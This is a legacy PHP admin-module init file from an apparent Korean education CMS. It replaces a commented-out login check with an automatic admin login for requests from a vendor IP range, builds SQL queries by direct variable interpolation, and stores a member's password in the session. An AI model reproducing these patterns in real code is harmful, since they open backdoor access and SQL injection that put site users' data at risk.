<?php
/* vim: set expandtab tabstop=4 shiftwidth=4 foldmethod=marker: */
/**
* 파일명: module/manage/__init__.php
* 작성일: 2006-06-01
* 작성자: 이범민
* 설  명: 
*****************************************************************
* 
*/
/*if($RUN_MODE == WEBAPP_RUNMODE_GLOBAL) {
    function check_manage_auth() {
        if(check_edumark_ip()) $_SESSION['MANAGE'] = true;
        return $_SESSION['MANAGE'];
    }
   if(!check_manage_auth()) {
        if($act != 'manage.login' && $act != 'manage.logout') {
            WebApp::redirect('manage.login');
        }
    }
}*/


if(check_edumark_ip()) {
		
	

    $DB = &WebApp::singleton('DB');

	$sql = "SELECT 
		str_id,
		str_name,
		str_passwd, 
		str_email,

		chr_mtype,
		str_nick,
		num_fcode,
		num_auth,
		str_setup
		
		FROM TAB_MEMBER 
		
		WHERE 
		num_oid=$_OID AND 
		 chr_mtype = 'z' and ROWNUM = 1
		
		
		";


		if($data = $DB->sqlFetch($sql)){
	
  

		$_SESSION['ADMIN'] = true;
        $_SESSION['AUTH'] = true;
        $_SESSION['REMOTE_ADDR'] = getenv('REMOTE_ADDR');
        $_SESSION['MEM_TYPE'] = $mem_type;
        $_SESSION['USERID'] = $data['str_id'];
        $_SESSION['NAME'] = $data['str_name'];
		$_SESSION['NICKNAME'] = $data['str_nick'];
		$_SESSION['SETUP'] = $data['str_setup'];
		$_SESSION['PASSWORD'] = $data['str_passwd'];
		$_SESSION['E_MAIL'] = $data['str_email'];
        $_SESSION['CHR_MTYPE'] = $data['chr_mtype'];
        $USER_TYPE = $_SESSION['CHR_MTYPE'];
		}
		

	}



$DB = &WebApp::singleton('DB');

$sql = "select str_title from TAB_MENU where num_oid = $_OID and num_mcode = $mcode ";
$DOC_TITLE = "str:".$DB -> sqlFetchOne($sql);

$table=array(
		"TAB_ANI_TEXT",
		"TAB_ATTACH_CONFIG",
		
		"TAB_ATTACH_PART",

		
		"TAB_BANNER",
		"TAB_BOARD",
		"TAB_BOARD_CATEGORY",
		"TAB_BOARD_COMMENT",
		"TAB_BOARD_CONFIG",
		"TAB_BOOK_LIST",
		"TAB_CALENDAR",
		"TAB_CLASS_BOARD",
		"TAB_CLASS_BOARD_COMMENT",
		"TAB_CLASS_BOARD_CONFIG",
		"TAB_CLASS_COUNCIL",
		"TAB_CLASS_COUNCIL_CONFIG",
		"TAB_CLASS_FORMATION",
		"TAB_CLASS_MAIN_BOARD",
		"TAB_CLASS_MENU",
		"TAB_CLASS_ONE_BOARD",
		"TAB_CONSULT_HISTORY",
		"TAB_CONTENT_URL",

		"TAB_CROSSUSER",
		"TAB_CSS",
		"TAB_CSS_CONFIG",

		"TAB_DOC_HTML",

		"TAB_FILES",
		"TAB_FORM",
		"TAB_FORM_CONFIG",
		"TAB_FORM_CSS",
		"TAB_GROUP",
		"TAB_GROUP_MEMBER",
		"TAB_IP_COUNTER",





	
		"TAB_LUNCH",

		"TAB_MEDIA",
		"TAB_MEDIA_CONFIG",
		"TAB_MEDIA_ORDER",
		"TAB_MEDIA_TIME",
		"TAB_MEMBER",
		"TAB_MEMBER_DEL",

		"TAB_MEMBER_UP",
		"TAB_MEMO",
		"TAB_MEM_CONFIRM",
		"TAB_MENU",
		"TAB_MENU_HIST",
		"TAB_MENU_RIGHT",
		"TAB_MOV_ADD",
		"TAB_PARTY",
		"TAB_PARTY_BOARD",
		"TAB_PARTY_BOARD_COMMENT",
		"TAB_PARTY_BOARD_CONFIG",
		"TAB_PARTY_COUNCIL",
		"TAB_PARTY_COUNCIL_CONFIG",
		"TAB_PARTY_MAIN_BOARD",
		"TAB_PARTY_MENU",
		"TAB_PAY",
		"TAB_PG_LOG",
		"TAB_POLL_CODE",
		"TAB_POLL_COMMENT",
		"TAB_POLL_CONTENTS",
		"TAB_POLL_IP",
		"TAB_POLL_MAIN",
		"TAB_POLL_USER",
		"TAB_POPUP",


		"TAB_SUBJECT_LIST",
		"TAB_SUBJECT_LIST_SUB",
		"TAB_TACH",

		"TAB_TITLE_DOC",

		);



//print_r($table);
?>